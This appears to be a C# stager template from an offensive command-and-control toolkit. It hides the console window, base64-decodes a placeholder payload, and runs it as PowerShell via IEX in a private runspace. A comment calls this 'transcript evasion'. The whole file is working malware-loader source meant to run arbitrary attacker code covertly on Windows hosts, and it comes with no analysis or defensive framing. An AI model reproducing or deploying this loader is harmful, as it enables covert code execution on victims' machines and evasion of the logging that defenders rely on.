using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
{
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    public const int SW_HIDE = 0;
    public const int SW_SHOW = 5;
    public static string basepayload = "#REPLACEME#";
    
    public Program() {
        try
        {
            string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(basepayload));
            InvokeAutomation(tt);
        }
        catch
        {
            Main();
        }
    }
    public static string InvokeAutomation(string cmd)
    {
        Runspace newrunspace = RunspaceFactory.CreateRunspace();
        newrunspace.Open();

        // transcript evasion
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
        var cmdin = new System.Management.Automation.PSVariable("c");
        newrunspace.SessionStateProxy.PSVariable.Set(cmdin);
        var output = new System.Management.Automation.PSVariable("o");
        newrunspace.SessionStateProxy.PSVariable.Set(output);

        Pipeline pipeline = newrunspace.CreatePipeline();
        newrunspace.SessionStateProxy.SetVariable("c", cmd);
        pipeline.Commands.AddScript("$o = IEX $c | Out-String");
        Collection<PSObject> results = pipeline.Invoke();
        newrunspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
    }
    public static void Sharp()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        try
        {
            string cmd = Encoding.UTF8.GetString(System.Convert.FromBase64String(basepayload));
            InvokeAutomation(cmd);
        }
        catch { }
    }
    public static void Main()
    {
        Sharp();
    }
}